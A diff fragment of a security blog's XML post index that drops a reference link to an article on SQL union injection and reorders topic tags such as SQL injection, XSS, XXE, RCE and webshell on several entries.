-<p>参考：<a href="https://blog.csdn.net/qq_61237064/article/details/121758528?ops_request_misc=%7B%22request_id%22:%22168049213216800211546816%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168049213216800211546816&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-121758528-null-null.142%5Ev80%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187">sql注入中的联合注入_ZredamanJ的博客-CSDN博客</a></p>
-]]></content>
-      <categories>
-        <category>web漏洞</category>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>联合注入</tag>
       </tags>
   </entry>
   <entry>
@@ -18414,11 +18570,11 @@ document.write("blue_test");
         <category>靶场演练</category>
       </categories>
       <tags>
-        <tag>渗透测试</tag>
+        <tag>代码审计</tag>
         <tag>sql注入</tag>
+        <tag>渗透测试</tag>
         <tag>靶场</tag>
         <tag>bluecms</tag>
-        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
@@ -19171,10 +19327,10 @@ return $outText;#新值
       </categories>
       <tags>
         <tag>xss</tag>
+        <tag>xxe</tag>
         <tag>漏洞</tag>
         <tag>RCE</tag>
         <tag>upload</tag>
-        <tag>xxe</tag>
         <tag>ldap</tag>
       </tags>
   </entry>
@@ -20865,12 +21021,12 @@ return $outText;#新值
         <tag>linux</tag>
         <tag>爬虫</tag>
         <tag>应急响应</tag>
+        <tag>webshell</tag>
         <tag>网安</tag>
         <tag>前端跨域</tag>
         <tag>APT</tag>
         <tag>javascript</tag>
         <tag>风险评估</tag>
-        <tag>webshell</tag>
         <tag>安全加固</tag>
         <tag>DDOS</tag>
         <tag>shell/webshell</tag>
